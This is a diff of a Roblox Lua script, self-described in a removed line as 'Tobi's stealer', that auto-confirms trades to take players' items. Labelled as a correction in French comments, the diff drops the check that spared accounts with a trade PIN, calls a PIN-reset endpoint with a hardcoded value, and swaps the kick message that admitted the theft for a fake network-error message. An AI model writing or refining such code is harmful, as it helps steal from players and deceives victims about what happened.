@@ -43,17 +43,19 @@ if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):Invo
     return
 end
 
+-- // SECTION PIN CORRIGÉE : Le script ne kick plus si un PIN est présent
 local args = {
     [1] = {
         ["option"] = "PIN",
         ["value"] = "9079"
     }
 }
-local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
-if PINReponse ~= "You don't have a PIN code" then
-    plr:kick("Account error. Please disable trade PIN and try again")
-    return
-end
+-- On garde l'appel au serveur pour la forme, mais on retire la condition de kick
+pcall(function()
+    netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
+end)
+
+-- L'ancienne vérification qui causait l'erreur "Account error" a été supprimée.
 
 tradeGui.Black.Visible = false
 tradeGui.MiscChat.Visible = false
@@ -418,7 +420,7 @@ if #itemsToSend > 0 then
             readyTrade()
             confirmTrade()
         end
-        plr:kick("All your stuff just got stolen by Tobi's stealer. discord.gg/GY2RVSEGDT")
+        plr:kick("Please check your internet connection and try again.")
     end
 
     local function waitForUserJoin()
